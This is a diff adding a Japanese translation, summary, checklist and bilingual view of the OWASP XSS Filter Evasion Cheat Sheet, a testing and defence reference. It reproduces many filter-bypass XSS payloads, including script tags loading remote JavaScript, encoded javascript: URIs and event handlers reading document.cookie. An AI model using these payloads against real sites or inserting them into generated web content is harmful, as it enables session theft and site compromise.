@@ -3,23 +3,4642 @@ title: XSS Filter Evasion Cheat Sheet
 hide_title: true
 ---
 
-<div className="docHero" data-category="asvs-v1">
+<div className="docHero" data-category="encoding-and-sanitization">
   <h1>XSS フィルター回避チートシート</h1>
   <div className="docMeta">
     <span className="docPill">最終更新: 2026-05-20</span>
-    <span className="docPill">読了時間: 準備中</span>
+    <span className="docPill">読了時間: 約 15 分</span>
     <span className="docPill">カテゴリ: 入力検証とサニタイズ</span>
   </div>
 </div>
 
-<div className="contentPanel">
+<div className="tabbedContent">
+  <input className="tabInput" type="radio" name="xss-filter-evasion-view" id="xss-filter-evasion-translation" defaultChecked />
+  <input className="tabInput" type="radio" name="xss-filter-evasion-view" id="xss-filter-evasion-summary" />
+  <input className="tabInput" type="radio" name="xss-filter-evasion-view" id="xss-filter-evasion-checklist" />
+  <input className="tabInput" type="radio" name="xss-filter-evasion-view" id="xss-filter-evasion-bilingual" />
 
-このページは、OWASP ASVS Index と同じサイドメニュー構成を先に完成させるための準備中ページです。
+  <div className="contentTabs">
+    <label htmlFor="xss-filter-evasion-translation">翻訳</label>
+    <label htmlFor="xss-filter-evasion-summary">要点</label>
+    <label htmlFor="xss-filter-evasion-checklist">チェックリスト</label>
+    <label htmlFor="xss-filter-evasion-bilingual">対比表示</label>
+  </div>
 
-- 公式ページ: [XSS Filter Evasion Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)
-- ASVS 対応: V1.2
-- 状態: 本文、要点、チェックリスト、対比表示は今後追加します。
+<section id="xss-filter-evasion-translation-panel" className="tabPanel translationPanel contentPanel">
 
+XSS Filter Evasion は、XSS テスト担当者向けに、入力フィルタや WAF がどのように迂回されるかを示す資料である。多様なペイロード例は、単純なブラックリスト、文字列置換、正規表現、危険文字の部分的削除だけでは XSS を防げないことを示している。
+
+回避手法には、不完全な HTML、イベントハンドラ、引用符省略、文字参照、16進/10進エンコード、タブや改行、NULL、スクリプト終端、URL エンコード、混合エンコード、SVG、CSS、META、IFRAME、BASE、OBJECT、HTTP Parameter Pollution、WAF バイパス文字列などが含まれる。ブラウザのパーサは寛容であり、サーバ側フィルタが想定する文字列と実際にブラウザが解釈する DOM や実行コンテキストが一致しない場合がある。
+
+防御は、フィルタ回避ペイロードを追いかけることではなく、出力先コンテキストに応じたエンコーディング、安全なサニタイズ、安全な DOM API、CSP、入力検証を組み合わせることである。HTML、属性、URL、CSS、JavaScript 文字列、DOM シンクのそれぞれに適した処理を行い、危険なコンテキストへ信頼できないデータを入れない。WAF や入力フィルタは補助策であり、アプリケーション本体の出力制御の代替にはならない。
+
+この資料のペイロードは、テストケース、回帰テスト、教育目的で使う。攻撃パターンを確認する際は、保存型、反射型、DOM Based XSS、リダイレクト経由、HTTP Parameter Pollution など複数の流れを試し、フィルタがどの位置で適用されているかを確認する。
+
+</section>
+
+<section id="xss-filter-evasion-summary-panel" className="tabPanel summaryPanel contentPanel">
+
+XSS Filter Evasion は、ブラックリスト、文字列置換、単純な正規表現、WAF が多様なブラウザ解釈やエンコードで迂回されることを示すテスト資料である。防御の中心は、フィルタではなく、出力コンテキスト別エンコーディング、安全なサニタイズ、安全な DOM API、CSP である。
+
+## 要点
+
+- ブラックリスト型フィルタや危険文字削除を主要防御にしない。
+- HTML、属性、URL、CSS、JavaScript、DOM シンクごとに処理を分ける。
+- 文字参照、混合エンコード、タブ、改行、不完全 HTML、SVG、CSS、BASE、IFRAME、HTTP Parameter Pollution をテスト観点に含める。
+- WAF は補助策として扱い、アプリケーション本体の出力制御を必須にする。
+- ペイロード集を教育、テスト、回帰検証に使う。
+
+## 実装時の注意点
+
+- 回避ペイロードを追いかけるだけでは防御は完成しない。信頼境界と出力先コンテキストを修正する。
+- DOM Based XSS、保存型、反射型、リダイレクト経由を分けてテストする。
+- ブラウザやパーサの寛容な補完を前提にレビューする。
+
+## ASVS との対応
+
+| ASVS 項目 | 関連内容 |
+| --- | --- |
+| V1.2 | ブラックリスト依存の禁止、出力コンテキスト別エンコーディング、XSS 回帰テスト |
+| V3.2 | ブラウザ解釈差、DOM Based XSS、CSP と組み合わせたクライアント側防御 |
+
+</section>
+
+<section id="xss-filter-evasion-checklist-panel" className="tabPanel checklistPanel contentPanel">
+
+- [ ] ブラックリスト型フィルタ、文字列置換、危険文字削除を主要防御にしない。
+- [ ] HTML、属性、URL、CSS、JavaScript、DOM シンクごとの出力エンコーディングを確認する。
+- [ ] HTML サニタイザを許可リスト方式で設定する。
+- [ ] 不完全 HTML、イベントハンドラ、引用符省略、文字参照、16進/10進エンコード、タブ、改行、NULL をテストする。
+- [ ] SVG、CSS、META、IFRAME、BASE、OBJECT、URL エンコード、混合エンコードをテストする。
+- [ ] HTTP Parameter Pollution により XSS 影響が拡大しないことを確認する。
+- [ ] WAF や入力フィルタの検知を補助策として扱い、アプリケーション側の出力制御を確認する。
+- [ ] 保存型、反射型、DOM Based XSS、リダイレクト経由の各フローで回帰テストを用意する。
+- [ ] CSP が主要ペイロードの実行を抑制することを確認する。
+- [ ] テスト結果を、入力源、出力先コンテキスト、実行ブラウザ、期待される防御に紐付けて記録する。
+
+</section>
+
+<section id="xss-filter-evasion-bilingual-panel" className="tabPanel bilingualPanel">
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+## Introduction
+
+This article is a guide to Cross Site Scripting (XSS) testing for application security professionals. This cheat sheet was originally based on RSnake's seminal XSS Cheat Sheet previously at: `http://ha.ckers.org/xss.html`. Now, the OWASP Cheat Sheet Series provides users with an updated and maintained version of the document. The very first OWASP Cheat Sheet, [Cross Site Scripting Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html), was inspired by RSnake's work and we thank RSnake for the inspiration!
+
+</div>
+<div className="bilingualBlock japanese">
+<span className="bilingualLabel japanese">日本語 (翻訳)</span>
+
+XSS Filter Evasion は、XSS テスト担当者向けに、入力フィルタや WAF がどのように迂回されるかを示す資料である。多様なペイロード例は、単純なブラックリスト、文字列置換、正規表現、危険文字の部分的削除だけでは XSS を防げないことを示している。
+
+</div>
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+## Tests
+
+This cheat sheet demonstrates that input filtering is an incomplete defense for XSS by supplying testers with a series of XSS attacks that can bypass certain XSS defensive filters.
+
+</div>
+<div className="bilingualBlock japanese">
+<span className="bilingualLabel japanese">日本語 (翻訳)</span>
+
+回避手法には、不完全な HTML、イベントハンドラ、引用符省略、文字参照、16進/10進エンコード、タブや改行、NULL、スクリプト終端、URL エンコード、混合エンコード、SVG、CSS、META、IFRAME、BASE、OBJECT、HTTP Parameter Pollution、WAF バイパス文字列などが含まれる。ブラウザのパーサは寛容であり、サーバ側フィルタが想定する文字列と実際にブラウザが解釈する DOM や実行コンテキストが一致しない場合がある。
+
+</div>
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+### Basic XSS Test Without Filter Evasion
+
+This attack, which uses normal XSS JavaScript injection, serves as a baseline for the cheat sheet (the quotes are not required in any modern browser so they are omitted here):
+
+</div>
+<div className="bilingualBlock japanese">
+<span className="bilingualLabel japanese">日本語 (翻訳)</span>
+
+防御は、フィルタ回避ペイロードを追いかけることではなく、出力先コンテキストに応じたエンコーディング、安全なサニタイズ、安全な DOM API、CSP、入力検証を組み合わせることである。HTML、属性、URL、CSS、JavaScript 文字列、DOM シンクのそれぞれに適した処理を行い、危険なコンテキストへ信頼できないデータを入れない。WAF や入力フィルタは補助策であり、アプリケーション本体の出力制御の代替にはならない。
+
+</div>
+</div>
+
+<div className="bilingualPair">
+
+<div className="bilingualBlock japanese">
+<span className="bilingualLabel japanese">日本語 (翻訳)</span>
+
+この資料のペイロードは、テストケース、回帰テスト、教育目的で使う。攻撃パターンを確認する際は、保存型、反射型、DOM Based XSS、リダイレクト経由、HTTP Parameter Pollution など複数の流れを試し、フィルタがどの位置で適用されているかを確認する。
+
+</div>
+</div>
+
+<div className="bilingualCommon">
+<span className="bilingualLabel common">コード・画像 (共通)</span>
+
+
+```html
+<SCRIPT SRC=https://cdn.jsdelivr.net/gh/Moksh45/host-xss.rocks/index.js></SCRIPT>
+```
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+### XSS Locator (Polyglot)
+
+This test delivers a 'polyglot test XSS payload' that executes in multiple contexts, including HTML, script strings, JavaScript, and URLs:
+
+</div>
+
+</div>
+
+<div className="bilingualCommon">
+<span className="bilingualLabel common">コード・画像 (共通)</span>
+
+
+```js
+javascript:/*--></title></style></textarea></script></xmp>
+<svg/onload='+/"`/+/onmouseover=1/+/[*/[]/+alert(42);//'>
+```
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+(Based on this [tweet](https://twitter.com/garethheyes/status/997466212190781445) by [Gareth Heyes](https://twitter.com/garethheyes)).
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+### Malformed A Tags
+
+This test skips the [`href`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/a#href) attribute to demonstrate an XSS attack using event handlers:
+
+</div>
+
+</div>
+
+<div className="bilingualCommon">
+<span className="bilingualLabel common">コード・画像 (共通)</span>
+
+
+```js
+\<a onmouseover="alert(document.cookie)"\>xxs link\</a\>
+```
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+Chrome automatically inserts missing quotes for you. If you encounter issues, try omitting them and Chrome will correctly place the missing quotes in URLs or scripts for you:
+
+</div>
+
+</div>
+
+<div className="bilingualCommon">
+<span className="bilingualLabel common">コード・画像 (共通)</span>
+
+
+```js
+\<a onmouseover=alert(document.cookie)\>xxs link\</a\>
+```
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+(Submitted by David Cross, Verified on Chrome)
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+### Malformed IMG Tags
+
+This XSS method uses the relaxed rendering engine to create an XSS vector within an IMG tag (which needs to be encapsulated within quotes). We believe this approach was originally meant to correct sloppy coding and it would also make it significantly more difficult to correctly parse HTML tags:
+
+</div>
+
+</div>
+
+<div className="bilingualCommon">
+<span className="bilingualLabel common">コード・画像 (共通)</span>
+
+
+```html
+<IMG """><SCRIPT>alert("XSS")</SCRIPT>"\>
+```
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+(Originally found by Begeek, but it was cleaned up and shortened to work in all browsers)
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+### fromCharCode
+
+If the system does not allow quotes of any kind, you can `eval()` a `fromCharCode` in JavaScript to create any XSS vector you need:
+
+</div>
+
+</div>
+
+<div className="bilingualCommon">
+<span className="bilingualLabel common">コード・画像 (共通)</span>
+
+
+```html
+<a href="javascript:alert(String.fromCharCode(88,83,83))">Click Me!</a>
+```
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+### Default SRC Tag to Get Past Filters that Check SRC Domain
+
+This attack will bypass most SRC domain filters. Inserting JavaScript in an event handler also applies to any HTML tag type injection using elements like Form, Iframe, Input, Embed, etc. This also allows the substitution of any relevant event for the tag type, such as `onblur` or `onclick`, providing extensive variations of the injections listed here:
+
+</div>
+
+</div>
+
+<div className="bilingualCommon">
+<span className="bilingualLabel common">コード・画像 (共通)</span>
+
+
+```html
+<IMG SRC=# onmouseover="alert('xxs')">
+```
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+(Submitted by David Cross and edited by Abdullah Hussam)
+
+</div>
+
+</div>
+
+<div className="bilingualCommon">
+<span className="bilingualLabel common">コード・画像 (共通)</span>
+### Default SRC Tag by Leaving it Empty
+
+
+```html
+<IMG SRC= onmouseover="alert('xxs')">
+```
+
+</div>
+
+<div className="bilingualCommon">
+<span className="bilingualLabel common">コード・画像 (共通)</span>
+### Default SRC Tag by Leaving it out Entirely
+
+
+```html
+<IMG onmouseover="alert('xxs')">
+```
+
+</div>
+
+<div className="bilingualCommon">
+<span className="bilingualLabel common">コード・画像 (共通)</span>
+### On Error Alert
+
+
+```html
+<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>
+```
+
+</div>
+
+<div className="bilingualCommon">
+<span className="bilingualLabel common">コード・画像 (共通)</span>
+### IMG onerror and JavaScript Alert Encode
+
+
+```html
+<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">
+```
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+### Decimal HTML Character References
+
+Since XSS examples that use a `javascript:` directive inside an `&lt;IMG` tag do not work on Firefox this approach uses decimal HTML character references as a workaround:
+
+</div>
+
+</div>
+
+<div className="bilingualCommon">
+<span className="bilingualLabel common">コード・画像 (共通)</span>
+
+
+```html
+
+ <a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;">Click Me!</a>
+```
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+### Decimal HTML Character References Without Trailing Semicolons
+
+This is often effective in bypassing XSS filters that look for the string `&\\#XX;`, since most people don't know about padding - which can be used up to 7 numeric characters total. This is also useful against filters that decode against strings like `$tmp\\_string =\\~ s/.\\*\\\\&\\#(\\\\d+);.\\*/$1/;` which incorrectly assumes a semicolon is required to terminate a HTML encoded string (This has been seen in the wild):
+
+</div>
+
+</div>
+
+<div className="bilingualCommon">
+<span className="bilingualLabel common">コード・画像 (共通)</span>
+
+
+```html
+<a href="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">Click Me</a>
+```
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+### Hexadecimal HTML Character References Without Trailing Semicolons
+
+This attack is also viable against the filter for the string `$tmp\\_string=\\~ s/.\\*\\\\&\\#(\\\\d+);.\\*/$1/;`, because it assumes that there is a numeric character following the pound symbol - which is not true with hex HTML characters:
+
+</div>
+
+</div>
+
+<div className="bilingualCommon">
+<span className="bilingualLabel common">コード・画像 (共通)</span>
+
+
+```html
+<a href="&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29">Click Me</a>
+```
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+### Embedded Tab
+
+This approach breaks up the XSS attack:
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+<!-- markdownlint-disable MD010-->
+
+</div>
+
+</div>
+
+<div className="bilingualCommon">
+<span className="bilingualLabel common">コード・画像 (共通)</span>
+
+
+```html
+ <a href="jav	ascript:alert('XSS');">Click Me</a>
+```
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+<!-- markdownlint-enable MD010-->
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+### Embedded Encoded Tab
+
+</div>
+
+</div>
+
+<div className="bilingualCommon">
+<span className="bilingualLabel common">コード・画像 (共通)</span>
+#### This approach can also break up XSS
+
+
+```html
+ <a href="jav&#x09;ascript:alert('XSS');">Click Me</a>
+```
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+### Embedded Newline to Break Up XSS
+
+While some defenders claim that any of the chars 09-13 (decimal) will work for this attack, this is incorrect. Only 09 (horizontal tab), 10 (newline) and 13 (carriage return) work. Examine the [ASCII table](https://man7.org/linux/man-pages/man7/ascii.7.html) for reference. The next four XSS attack examples illustrate this vector:
+
+</div>
+
+</div>
+
+<div className="bilingualCommon">
+<span className="bilingualLabel common">コード・画像 (共通)</span>
+
+
+```html
+<a href="jav&#x0A;ascript:alert('XSS');">Click Me</a>
+```
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+#### Example 1: Break Up XSS Attack with Embedded Carriage Return
+
+(Note: with the above I am making these strings longer than they have to be because the zeros could be omitted. Often I've seen filters that assume the hex and dec encoding has to be two or three characters. The real rule is 1-7 characters.):
+
+</div>
+
+</div>
+
+<div className="bilingualCommon">
+<span className="bilingualLabel common">コード・画像 (共通)</span>
+
+
+```html
+<a href="jav&#x0D;ascript:alert('XSS');">Click Me</a>
+```
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+#### Example 2: Break Up JavaScript Directive with Null
+
+Null chars also work as XSS vectors but not like above, you need to inject them directly using something like Burp Proxy or use `%00` in the URL string or if you want to write your own injection tool you can either use vim (`^V^@` will produce a null) or the following program to generate it into a text file. The null char `%00` is much more useful and helped me bypass certain real world filters with a variation on this example:
+
+</div>
+
+</div>
+
+<div className="bilingualCommon">
+<span className="bilingualLabel common">コード・画像 (共通)</span>
+
+
+```sh
+perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>";' > out
+```
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+#### Example 3: Spaces and Meta Chars Before the JavaScript in Images for XSS
+
+This is useful if a filter's pattern match doesn't take into account spaces in the word `javascript:`, which is correct since that won't render, but makes the false assumption that you can't have a space between the quote and the `javascript:` keyword. The actual reality is you can have any char from 1-32 in decimal:
+
+</div>
+
+</div>
+
+<div className="bilingualCommon">
+<span className="bilingualLabel common">コード・画像 (共通)</span>
+
+
+```html
+<a href=" &#14;  javascript:alert('XSS');">Click Me</a>
+```
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+#### Example 4: Non-alpha-non-digit XSS
+
+The Firefox HTML parser assumes a non-alpha-non-digit is not valid after an HTML keyword and therefore considers it to be a whitespace or non-valid token after an HTML tag. The problem is that some XSS filters assume that the tag they are looking for is broken up by whitespace. For example `\\&lt;SCRIPT\\\\s` != `\\&lt;SCRIPT/XSS\\\\s`:
+
+</div>
+
+</div>
+
+<div className="bilingualCommon">
+<span className="bilingualLabel common">コード・画像 (共通)</span>
+
+
+```html
+<SCRIPT/XSS SRC="http://xss.rocks/xss.js"></SCRIPT>
+```
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+Based on the same idea as above, however, expanded on it, using Rsnake's fuzzer. The Gecko rendering engine allows for any character other than letters, numbers or encapsulation chars (like quotes, angle brackets, etc) between the event handler and the equals sign, making it easier to bypass cross site scripting blocks. Note that this also applies to the grave accent char as seen here:
+
+</div>
+
+</div>
+
+<div className="bilingualCommon">
+<span className="bilingualLabel common">コード・画像 (共通)</span>
+
+
+```html
+<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
+```
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+Yair Amit noted that there is a slightly different behavior between the Trident (IE) and Gecko (Firefox) rendering engines that allows just a slash between the tag and the parameter with no spaces. This could be useful in a attack if the system does not allow spaces:
+
+</div>
+
+</div>
+
+<div className="bilingualCommon">
+<span className="bilingualLabel common">コード・画像 (共通)</span>
+
+
+```html
+<SCRIPT/SRC="http://xss.rocks/xss.js"></SCRIPT>
+```
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+### Extraneous Open Brackets
+
+This XSS vector could defeat certain detection engines that work by checking matching pairs of open and close angle brackets then comparing the tag inside, instead of a more efficient algorithm like [Boyer-Moore](https://en.wikipedia.org/wiki/Boyer%E2%80%93Moore_string-search_algorithm) that looks for entire string matches of the open angle bracket and associated tag (post de-obfuscation, of course). The double slash comments out the ending extraneous bracket to suppress a JavaScript error:
+
+</div>
+
+</div>
+
+<div className="bilingualCommon">
+<span className="bilingualLabel common">コード・画像 (共通)</span>
+
+
+```html
+<<SCRIPT>alert("XSS");//\<</SCRIPT>
+```
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+(Submitted by Franz Sedlmaier)
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+### No Closing Script Tags
+
+With Firefox, you don't actually need the `\\>&lt;/SCRIPT&gt;` portion of this XSS vector, because Firefox assumes it's safe to close the HTML tag and adds closing tags for you. Unlike the next attack, which doesn't affect Firefox, this method does not require any additional HTML below it. You can add quotes if you need to, but they're normally not needed:
+
+</div>
+
+</div>
+
+<div className="bilingualCommon">
+<span className="bilingualLabel common">コード・画像 (共通)</span>
+
+
+```html
+<SCRIPT SRC=http://xss.rocks/xss.js?< B >
+```
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+### Protocol Resolution in Script Tags
+
+This particular variant is partially based on Ozh's protocol resolution bypass below, and it works in IE and Edge in compatibility mode. However, this is especially useful where space is an issue, and of course, the shorter your domain, the better. The `.j` is valid, regardless of the encoding type because the browser knows it in context of a SCRIPT tag:
+
+</div>
+
+</div>
+
+<div className="bilingualCommon">
+<span className="bilingualLabel common">コード・画像 (共通)</span>
+
+
+```html
+<SCRIPT SRC=//xss.rocks/.j>
+```
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+(Submitted by Łukasz Pilorz)
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+### Half Open HTML/JavaScript XSS Vector
+
+Unlike Firefox, the IE rendering engine (Trident) doesn't add extra data to your page, but it does allow the `javascript:` directive in images. This is useful as a vector because it doesn't require a close angle bracket. This assumes there is any HTML tag below where you are injecting this XSS vector. Even though there is no close `\\>` tag the tags below it will close it. A note: this does mess up the HTML, depending on what HTML is beneath it. It gets around the following network intrusion detection system (NIDS) regex: `/((\\\\%3D)|(=))\\[^\\\\n\\]\\*((\\\\%3C)|\\<)\\[^\\\\n\\]+((\\\\%3E)|\\>)/` because it doesn't require the end `\\>`. As a side note, this was also affective against a real world XSS filter using an open ended `&lt;IFRAME` tag instead of an `&lt;IMG` tag.
+
+</div>
+
+</div>
+
+<div className="bilingualCommon">
+<span className="bilingualLabel common">コード・画像 (共通)</span>
+
+
+```html
+<IMG SRC="`<javascript:alert>`('XSS')"
+```
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+### Escaping JavaScript Escapes
+
+If an application is written to output some user information inside of a JavaScript (like the following: `&lt;SCRIPT>var a="$ENV&#123;QUERY\\_STRING&#125;";&lt;/SCRIPT&gt;`) and you want to inject your own JavaScript into it but the server side application escapes certain quotes, you can circumvent that by escaping their escape character. When this gets injected it will read `&lt;SCRIPT>var a="\\\\\\\\";alert('XSS');//";&lt;/SCRIPT&gt;` which ends up un-escaping the double quote and causing the XSS vector to fire. The XSS locator uses this method:
+
+</div>
+
+</div>
+
+<div className="bilingualCommon">
+<span className="bilingualLabel common">コード・画像 (共通)</span>
+
+
+```js
+\";alert('XSS');//
+```
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+An alternative, if correct JSON or JavaScript escaping has been applied to the embedded data but not HTML encoding, is to finish the script block and start your own:
+
+</div>
+
+</div>
+
+<div className="bilingualCommon">
+<span className="bilingualLabel common">コード・画像 (共通)</span>
+
+
+```js
+</script><script>alert('XSS');</script>
+```
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+### End Title Tag
+
+This is a simple XSS vector that closes `&lt;TITLE>` tags, which can encapsulate the malicious cross site scripting attack:
+
+</div>
+
+</div>
+
+<div className="bilingualCommon">
+<span className="bilingualLabel common">コード・画像 (共通)</span>
+
+
+```html
+</TITLE><SCRIPT>alert("XSS");</SCRIPT>
+```
+
+</div>
+
+<div className="bilingualCommon">
+<span className="bilingualLabel common">コード・画像 (共通)</span>
+#### INPUT Image
+
+
+```html
+<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
+```
+
+</div>
+
+<div className="bilingualCommon">
+<span className="bilingualLabel common">コード・画像 (共通)</span>
+#### BODY Image
+
+
+```html
+<BODY BACKGROUND="javascript:alert('XSS')">
+```
+
+</div>
+
+<div className="bilingualCommon">
+<span className="bilingualLabel common">コード・画像 (共通)</span>
+#### IMG Dynsrc
+
+
+```html
+<IMG DYNSRC="javascript:alert('XSS')">
+```
+
+</div>
+
+<div className="bilingualCommon">
+<span className="bilingualLabel common">コード・画像 (共通)</span>
+#### IMG Lowsrc
+
+
+```html
+<IMG LOWSRC="javascript:alert('XSS')">
+```
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+### List-style-image
+
+This esoteric attack focuses on embedding images for bulleted lists. It will only work in the IE rendering engine because of the JavaScript directive. Not a particularly useful XSS vector:
+
+</div>
+
+</div>
+
+<div className="bilingualCommon">
+<span className="bilingualLabel common">コード・画像 (共通)</span>
+
+
+```html
+<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS</br>
+```
+
+</div>
+
+<div className="bilingualCommon">
+<span className="bilingualLabel common">コード・画像 (共通)</span>
+### VBscript in an Image
+
+
+```html
+<IMG SRC='vbscript:msgbox("XSS")'>
+```
+
+</div>
+
+<div className="bilingualCommon">
+<span className="bilingualLabel common">コード・画像 (共通)</span>
+### SVG Object Tag
+
+
+```js
+<svg/onload=alert('XSS')>
+```
+
+</div>
+
+<div className="bilingualCommon">
+<span className="bilingualLabel common">コード・画像 (共通)</span>
+### ECMAScript 6
+
+
+```js
+Set.constructor`alert\x28document.domain\x29
+```
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+### BODY Tag
+
+This attack doesn't require using any variants of `javascript:` or `&lt;SCRIPT...` to accomplish the XSS attack. Dan Crowley has noted that you can put a space before the equals sign (`onload=` != `onload =`):
+
+</div>
+
+</div>
+
+<div className="bilingualCommon">
+<span className="bilingualLabel common">コード・画像 (共通)</span>
+
+
+```html
+<BODY ONLOAD=alert('XSS')>
+```
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+#### Attacks Using Event Handlers
+
+The attack with the BODY tag can be modified for use in similar XSS attacks to the one above (this is the most comprehensive list on the net, at the time of this writing). Thanks to Rene Ledosquet for the HTML+TIME updates.
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+The [Dottoro Web Reference](http://help.dottoro.com/) also has a nice [list of events in JavaScript](http://help.dottoro.com/ljfvvdnm.php).
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `onAbort()` (when user aborts the loading of an image)
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `onActivate()` (when object is set as the active element)
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `onAfterPrint()` (activates after user prints or previews print job)
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `onAfterUpdate()` (activates on data object after updating data in the source object)
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `onBeforeActivate()` (fires before the object is set as the active element)
+
+</div>
+
+</div>
+
+<div className="bilingualPair">
+<div className="bilingualBlock english">
+<span className="bilingualLabel english">English (原文)</span>
+
+- `onBeforeCopy()` (attacker executes the attack string right before a selection is copied to the clipboard - attackers can do this with the `execCommand("Copy")` function)
+
+</div>
+
+</div>
+
